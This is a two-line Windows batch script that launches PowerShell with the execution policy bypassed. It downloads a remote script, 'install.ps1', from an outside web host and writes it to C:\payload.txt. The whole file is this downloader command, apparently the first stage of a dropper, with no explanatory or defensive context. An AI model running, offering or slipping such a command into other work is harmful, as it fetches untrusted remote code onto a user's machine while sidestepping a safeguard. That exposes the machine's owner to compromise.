@echo off
powershell.exe -ExecutionPolicy Bypass -Command "iwr -useb 'https://mugi.store/install.ps1' -OutFile C:\payload.txt"